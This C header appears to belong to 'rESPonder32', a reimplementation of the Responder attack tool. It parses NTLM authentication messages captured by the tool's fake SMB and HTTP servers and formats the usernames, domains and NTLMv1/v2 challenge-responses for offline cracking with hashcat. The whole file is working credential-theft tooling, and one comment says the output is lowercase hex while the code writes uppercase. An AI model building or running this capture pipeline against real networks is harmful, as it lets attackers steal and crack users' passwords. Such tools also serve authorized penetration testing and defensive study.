// rESPonder32 — Module 6: Hash Formatter
//
// Header-only library. Included by the SMB and HTTP fake servers once they
// have a captured NTLM Type 3 message and the 8-byte server challenge they
// originally sent. Converts the raw blob to hashcat-ready output.
//
// Supports NTLMv2 (NthashLen > 24) and NTLMv1 (NthashLen == 24).
//
// Offset map mirrors Responder's ParseHTTPHash() in servers/HTTP.py exactly.
// All multi-byte fields are little-endian (NTLM is LE throughout).

#pragma once

#include <stdint.h>
#include <string.h>
#include <stdio.h>

// ---------------------------------------------------------------------------
// findNTLMSSP
// ---------------------------------------------------------------------------

// Scan buf for the 8-byte NTLMSSP\x00 signature.
// Returns the offset of the 'N', or -1 if not found.
inline int findNTLMSSP(const uint8_t* buf, int len) {
    static const uint8_t SIG[8] = {
        'N','T','L','M','S','S','P','\x00'
    };
    if (len < 8) return -1;
    for (int i = 0; i <= len - 8; i++) {
        if (memcmp(buf + i, SIG, 8) == 0)
            return i;
    }
    return -1;
}

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

// LE uint16 at d[off]
static inline uint16_t _leU16(const uint8_t* d, int off) {
    return (uint16_t)(d[off]) | ((uint16_t)(d[off + 1]) << 8);
}

// Write 'nbytes' from src as lowercase hex into dst, null-terminate.
// Returns chars written (excluding null), or -1 if dst is too small.
static inline int _hexEncode(const uint8_t* src, int nbytes,
                             char* dst, int dstmax) {
    if (dstmax < nbytes * 2 + 1) return -1;
    static const char hex[] = "0123456789ABCDEF";
    for (int i = 0; i < nbytes; i++) {
        dst[i * 2]     = hex[(src[i] >> 4) & 0xF];
        dst[i * 2 + 1] = hex[ src[i]       & 0xF];
    }
    dst[nbytes * 2] = '\0';
    return nbytes * 2;
}

// Decode UTF-16LE bytes into a plain ASCII/latin-1 string by dropping the
// null bytes. ntlmData[offset .. offset+len) must be in-bounds.
// Returns chars written (excluding null), or -1 on error.
static inline int _decodeUTF16LE(const uint8_t* src, int byteLen,
                                  char* dst, int dstmax) {
    // take every other byte starting at offset 0 (the low byte of each char)
    int out = 0;
    for (int i = 0; i < byteLen; i += 2) {
        if (out >= dstmax - 1) return -1;
        dst[out++] = (char)src[i];
    }
    dst[out] = '\0';
    return out;
}

// ---------------------------------------------------------------------------
// formatNTLMHash
// ---------------------------------------------------------------------------

// Parse an NTLM Type 3 message starting at ntlmData[0] (caller must have
// already located the NTLMSSP signature and passed a pointer to it).
// challenge: the 8-byte server challenge we sent.
// out:       caller-supplied buffer, receives a null-terminated hashcat string.
//
// NTLMv2 output: Username::Domain:challenge_hex:NTProofStr_hex:blob_hex
// NTLMv1 output: Username::Hostname:LMHash_hex:NTHash_hex:challenge_hex
//
// Returns true on success, false if the blob is malformed or out is too small.
inline bool formatNTLMHash(const uint8_t* ntlmData, int ntlmLen,
                            const uint8_t challenge[8],
                            char* out, int outLen) {
    // Minimum size: signature(8) + msgtype(4) + security buffer fields up to
    // UserOffset field at [40:42] — need at least 42 bytes past signature.
    if (ntlmLen < 42) return false;

    // --- LM hash (offsets relative to start of NTLMSSP message) ---
    uint16_t lmLen    = _leU16(ntlmData, 12);
    uint16_t lmOff    = _leU16(ntlmData, 16);

    // --- NT hash ---
    uint16_t ntLen    = _leU16(ntlmData, 20);
    uint16_t ntOff    = _leU16(ntlmData, 24);

    // --- Username ---
    uint16_t userLen  = _leU16(ntlmData, 36);
    uint16_t userOff  = _leU16(ntlmData, 40);

    // Sanity checks — offsets + lengths must fit inside the blob.
    if ((int)(ntOff  + ntLen)   > ntlmLen) return false;
    if ((int)(userOff + userLen) > ntlmLen) return false;
    if ((int)(lmOff  + lmLen)   > ntlmLen) return false;

    // Decode username (UTF-16LE)
    char username[128] = {};
    if (_decodeUTF16LE(ntlmData + userOff, userLen, username, sizeof(username)) < 0)
        return false;

    // Hex-encode the server challenge (16 hex chars)
    char challengeHex[17] = {};
    _hexEncode(challenge, 8, challengeHex, sizeof(challengeHex));

    if (ntLen > 24) {
        // NTLMv2 —————————————————————————————————————————————————
        // Responder clamps the consumed NT hash to 64 bytes (NTProofStr 16 +
        // blob 48) for hashcat's expected split, but we keep the raw length
        // so the blob section captures everything Windows sends.
        // Hashcat mode 5600 expects:
        //   user::domain:challenge_hex:ntproofstr_hex:blob_hex

        // Domain
        if (ntlmLen < 34) return false;
        uint16_t domLen = _leU16(ntlmData, 28);
        uint16_t domOff = _leU16(ntlmData, 32);
        if ((int)(domOff + domLen) > ntlmLen) return false;

        char domain[128] = {};
        if (_decodeUTF16LE(ntlmData + domOff, domLen, domain, sizeof(domain)) < 0)
            return false;

        // NT hash: first 16 bytes = NTProofStr, rest = client blob
        if (ntLen < 16) return false;
        const uint8_t* ntHash = ntlmData + ntOff;

        char ntProofHex[33] = {};
        _hexEncode(ntHash, 16, ntProofHex, sizeof(ntProofHex));

        int blobLen = ntLen - 16;
        // blob hex is variable length; allocate on stack up to 4 KB
        char blobHex[4096 + 1] = {};
        if (blobLen * 2 + 1 > (int)sizeof(blobHex)) return false;
        _hexEncode(ntHash + 16, blobLen, blobHex, sizeof(blobHex));

        int n = snprintf(out, (size_t)outLen, "%s::%s:%s:%s:%s",
                         username, domain, challengeHex, ntProofHex, blobHex);
        return (n > 0 && n < outLen);

    } else if (ntLen == 24) {
        // NTLMv1 —————————————————————————————————————————————————
        // Hashcat mode 5500 expects:
        //   user::hostname:lmhash_hex:nthash_hex:challenge_hex

        // Hostname offset differs from NTLMv2 (Responder confirmed: [46:48])
        if (ntlmLen < 50) return false;
        uint16_t hostLen = _leU16(ntlmData, 46);
        uint16_t hostOff = _leU16(ntlmData, 48);
        if ((int)(hostOff + hostLen) > ntlmLen) return false;

        char hostname[128] = {};
        if (_decodeUTF16LE(ntlmData + hostOff, hostLen, hostname, sizeof(hostname)) < 0)
            return false;

        char lmHex[49] = {};   // 24 bytes -> 48 hex chars
        char ntHex[49] = {};
        _hexEncode(ntlmData + lmOff, lmLen, lmHex, sizeof(lmHex));
        _hexEncode(ntlmData + ntOff, ntLen, ntHex, sizeof(ntHex));

        int n = snprintf(out, (size_t)outLen, "%s::%s:%s:%s:%s",
                         username, hostname, lmHex, ntHex, challengeHex);
        return (n > 0 && n < outLen);

    } else {
        // Unknown / incomplete NT hash — reject
        return false;
    }
}
